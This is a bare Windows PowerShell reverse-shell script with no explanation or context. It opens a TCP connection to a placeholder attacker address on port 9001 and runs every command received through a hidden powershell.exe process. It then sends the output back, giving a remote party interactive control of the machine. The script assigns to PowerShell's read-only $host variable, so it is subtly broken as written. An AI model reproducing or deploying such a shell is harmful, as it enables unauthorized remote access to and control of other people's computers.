# windows
# Requires -Version 5.1
Add-Type -AssemblyName System.Net.Primitives
Add-Type -AssemblyName System.Net.Sockets

function Main {
    $host = 'IP_ADDRESS'
    $port = 9001

    $sock = $null
    try {
        # Create TCP socket and connect
        $sock = New-Object System.Net.Sockets.TcpClient
        $sock.Connect($host, $port)
        $stream = $sock.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        # Send initial prompt
        $writer.Write('SHELL> ')

        while ($true) {
            # Receive command
            $buffer = New-Object byte[] 4096
            $readBytes = $stream.Read($buffer, 0, $buffer.Length)
            if ($readBytes -le 0) { break }

            $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $readBytes)
            $command = $data.TrimEnd("`n")

            if ($command.ToLower() -eq 'exit') {
                break
            }

            try {
                # Execute command using PowerShell
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = 'powershell.exe'
                $psi.Arguments = "-Command $command"
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true

                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi
                $process.Start() | Out-Null

                if (-not $process.WaitForExit(30000)) {
                    $process.Kill()
                    $output = "Command timed out after 30 seconds`n"
                }
                else {
                    $stdout = $process.StandardOutput.ReadToEnd()
                    $stderr = $process.StandardError.ReadToEnd()
                    $output = $stdout + $stderr
                }
            }
            catch {
                $output = "Error executing command: $($_.Exception.Message)`n"
            }

            # Send output with prompt
            $response = $output + 'SHELL> '
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($response)
            $stream.Write($bytes, 0, $bytes.Length)
        }
    }
    catch [System.Net.Sockets.SocketException] {
        Write-Host "Connection refused to $host`:$port"
    }
    catch [System.TimeoutException] {
        Write-Host "Connection timeout"
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    finally {
        if ($sock -ne $null) {
            $sock.Close()
        }
    }
}

Main